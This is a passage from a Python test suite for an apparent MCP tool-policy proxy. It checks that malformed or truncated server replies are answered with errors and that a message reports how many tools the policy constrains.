                {"jsonrpc": "2.0", "id": 1, "result": {"content": []}},
                {"jsonrpc": "2.0", "id": 2, "result": {"content": []}},
            ]
        )
        effects = proxy.server_line(raw)
        assert sorted(r["id"] for r in replies(effects)) == [1, 2]
        assert all(r["error"]["code"] == -32603 for r in replies(effects))

    def test_a_truncated_tail_is_answered(self) -> None:
        proxy = core()
        tracked_call(proxy, 3)
        effects = proxy.server_event(Tail(b'{"jsonrpc":"2.0","id":3,"result":{"cont'))
        assert replies(effects)[0]["error"]["code"] == -32603
        assert "unterminated" in replies(effects)[0]["error"]["message"]


class TestCoverageLine:
    """C2 / CEO-2: say how much of the server the policy covers, when it changes."""

    def test_printed_after_the_first_list_and_again_only_when_counts_change(self) -> None:
        proxy = core()
        proxy.client_line(list_request(1))
        first = proxy.server_line(
            tools_reply(1, [{"name": "fetch", "inputSchema": FETCH_SCHEMA}, {"name": "a"}])
        )
        assert "toolgate[fetch]: 1 of 2 tools constrained (default: allow)" in first.messages[-1]

        proxy.client_line(list_request(2))
        same = proxy.server_line(
            tools_reply(2, [{"name": "fetch", "inputSchema": FETCH_SCHEMA}, {"name": "a"}])
        )
        assert not any("constrained" in m for m in same.messages)

        proxy.client_line(list_request(3))
        grown = proxy.server_line(tools_reply(3, [{"name": "b"}, {"name": "c"}]))
        assert "1 of 4 tools constrained" in grown.messages[-1]

    def test_default_block_counts_every_unnamed_tool(self) -> None:
        proxy = core({"default": "block", "rules": {"fetch.ok": {}}})
        proxy.client_line(list_request(1))
        effects = proxy.server_line(tools_reply(1, [{"name": "ok"}, {"name": "x"}, {"name": "y"}]))
        assert "2 of 3 tools constrained (default: block)" in effects.messages[-1]
